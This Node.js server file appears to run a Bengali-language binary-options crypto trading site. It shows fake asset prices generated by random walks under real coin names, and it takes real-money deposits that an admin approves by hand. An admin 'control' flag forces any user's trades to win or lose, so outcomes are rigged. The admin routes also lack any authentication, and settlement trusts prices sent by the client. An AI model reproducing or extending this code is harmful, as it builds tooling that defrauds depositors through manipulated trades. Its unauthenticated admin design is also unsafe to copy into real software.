const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let users = {
  "demo_user": { liveBalance: 10.00, demoBalance: 11061.95, activeAccount: "demo", control: "normal" }
};
let transactions = [];

let ASSETS = {
  'BTC':  { name: 'Bitcoin', ticker: 'BTC', price: 68481.50, decimals: 2, payout: 92, vol: 3.5 },
  'ETH':  { name: 'Ethereum', ticker: 'ETH', price: 3420.00, decimals: 2, payout: 90, vol: 0.8 },
  'SOL':  { name: 'Solana', ticker: 'SOL', price: 177.25, decimals: 2, payout: 88, vol: 0.15 },
  'BNB':  { name: 'BNB', ticker: 'BNB', price: 590.20, decimals: 2, payout: 88, vol: 0.25 },
  'XRP':  { name: 'XRP', ticker: 'XRP', price: 0.6250, decimals: 4, payout: 85, vol: 0.0006 },
  'DOGE': { name: 'Dogecoin', ticker: 'DOGE', price: 0.1425, decimals: 4, payout: 82, vol: 0.0003 },
  'TON':  { name: 'Toncoin', ticker: 'TON', price: 5.850, decimals: 3, payout: 86, vol: 0.006 },
  'ADA':  { name: 'Cardano', ticker: 'ADA', price: 0.4850, decimals: 4, payout: 84, vol: 0.0005 }
};

let candleHistories = {};
let currentCandleMinute = Math.floor(Date.now() / 60000) * 60;

for (let key in ASSETS) {
  let meta = ASSETS[key];
  candleHistories[key] = [];
  let p = meta.price;
  for (let i = 80; i > 0; i--) {
    let t = currentCandleMinute - (i * 60);
    let o = p;
    let delta = (Math.random() - 0.49) * meta.vol * 2.2;
    let c = parseFloat((o + delta).toFixed(meta.decimals));
    let h = parseFloat((Math.max(o, c) + Math.random() * meta.vol).toFixed(meta.decimals));
    let l = parseFloat((Math.min(o, c) - Math.random() * meta.vol).toFixed(meta.decimals));
    candleHistories[key].push({ time: t, open: o, high: h, low: l, close: c });
    p = c;
  }
  candleHistories[key].push({ time: currentCandleMinute, open: p, high: p, low: p, close: p });
}

setInterval(() => {
  let now = Date.now();
  let sec = Math.floor(now / 1000);
  let nowMinute = Math.floor(sec / 60) * 60;
  let remainingSec = 60 - (sec % 60);

  let isNewMinute = (nowMinute > currentCandleMinute);

  for (let key in ASSETS) {
    let meta = ASSETS[key];
    let delta = (Math.random() - 0.495) * meta.vol;
    meta.price = parseFloat((meta.price + delta).toFixed(meta.decimals));

    let list = candleHistories[key];
    let lastCandle = list[list.length - 1];

    if (isNewMinute) {
      list.push({
        time: nowMinute,
        open: meta.price,
        high: meta.price,
        low: meta.price,
        close: meta.price
      });
      if (list.length > 200) list.shift();
    } else {
      if (meta.price > lastCandle.high) lastCandle.high = meta.price;
      if (meta.price < lastCandle.low) lastCandle.low = meta.price;
      lastCandle.close = meta.price;
    }
  }

  if (isNewMinute) currentCandleMinute = nowMinute;

  let tickPayload = {
    type: 'TICK',
    countdown: remainingSec,
    serverTime: now,
    assets: {}
  };

  for (let key in ASSETS) {
    let list = candleHistories[key];
    tickPayload.assets[key] = {
      price: ASSETS[key].price.toFixed(ASSETS[key].decimals),
      candle: list[list.length - 1],
      payout: ASSETS[key].payout
    };
  }

  let broadcastData = JSON.stringify(tickPayload);
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(broadcastData);
  });
}, 1000);

app.get('/api/history/:asset', (req, res) => {
  let asset = req.params.asset || 'BTC';
  if (candleHistories[asset]) {
    res.json({
      success: true,
      history: candleHistories[asset],
      meta: ASSETS[asset]
    });
  } else {
    res.json({ success: false });
  }
});

app.post('/api/trade', (req, res) => {
  const { username, amount, direction, accountType, durationSec, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let tradeAmount = Number(amount) || 1;
  let targetBal = accountType === 'live' ? user.liveBalance : user.demoBalance;

  if (targetBal < tradeAmount) {
    return res.json({ success: false, message: "অপর্যাপ্ত ব্যালেন্স!" });
  }

  if (accountType === 'live') user.liveBalance -= tradeAmount;
  else user.demoBalance -= tradeAmount;

  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];
  res.json({
    success: true,
    entryPrice: selectedAsset.price.toFixed(selectedAsset.decimals),
    balance: (accountType === 'live' ? user.liveBalance : user.demoBalance).toFixed(2),
    direction,
    amount: tradeAmount,
    durationSec,
    asset
  });
});

app.post('/api/settle-trade', (req, res) => {
  const { username, entryPrice, exitPrice, direction, amount, accountType, asset } = req.body;
  let user = users[username] || users["demo_user"];
  let selectedAsset = ASSETS[asset] || ASSETS['BTC'];
  let tradeAmount = Number(amount) || 1;

  let isWin = false;
  if (user.control === 'win') isWin = true;
  else if (user.control === 'loss') isWin = false;
  else {
    if (direction === 'UP') isWin = (Number(exitPrice) > Number(entryPrice));
    else if (direction === 'DOWN') isWin = (Number(exitPrice) < Number(entryPrice));
  }

  let profit = isWin ? parseFloat((tradeAmount * (1 + selectedAsset.payout / 100)).toFixed(2)) : 0;
  if (isWin) {
    if (accountType === 'live') user.liveBalance += profit;
    else user.demoBalance += profit;
  }

  res.json({
    success: true,
    isWin,
    profit,
    balance: (accountType === 'live' ? user.liveBalance : user.demoBalance).toFixed(2)
  });
});

app.post('/api/switch-account', (req, res) => {
  const { username, type } = req.body;
  let user = users[username] || users["demo_user"];
  user.activeAccount = type;
  res.json({ success: true, activeAccount: type, balance: type === 'live' ? user.liveBalance : user.demoBalance });
});

app.post('/api/deposit', (req, res) => {
  const { username, method, amount, trxId, senderNumber } = req.body;
  if (!amount || Number(amount) <= 0 || !trxId) {
    return res.json({ success: false, message: "পরিমাণ এবং TrxID পূরণ করুন!" });
  }

  let tx = {
    id: Date.now(),
    username: username || "demo_user",
    type: "Deposit",
    method,
    amount: Number(amount),
    senderNumber: senderNumber || "N/A",
    trxId,
    status: "Pending",
    time: new Date().toLocaleTimeString()
  };
  transactions.unshift(tx);
  res.json({ success: true, message: "ডিপোজিট রিকোয়েস্ট সফলভাবে জমা হয়েছে!" });
});

app.get(['/admin', '/admin-secret-panel'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/api/admin/data', (req, res) => {
  let totalDeposit = transactions.filter(t => t.type === 'Deposit' && t.status === 'Approved').reduce((s, t) => s + Number(t.amount), 0);
  res.json({ users, transactions, assets: ASSETS, totalDeposit });
});

app.post('/api/admin/tx-action', (req, res) => {
  const { txId, status } = req.body;
  let tx = transactions.find(t => t.id == txId);
  if (tx) {
    tx.status = status;
    if (status === 'Approved') {
      let u = users[tx.username] || users["demo_user"];
      u.liveBalance += Number(tx.amount);
    }
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/api/admin/update-payout', (req, res) => {
  const { asset, payout } = req.body;
  if (ASSETS[asset]) {
    ASSETS[asset].payout = Number(payout);
    res.json({ success: true });
  } else res.json({ success: false });
});

app.post('/api/admin/action', (req, res) => {
  const { username, action, value } = req.body;
  if (users[username]) {
    if (action === 'control') users[username].control = value;
    res.json({ success: true });
  } else res.json({ success: false });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Master server running on port ${PORT}`));
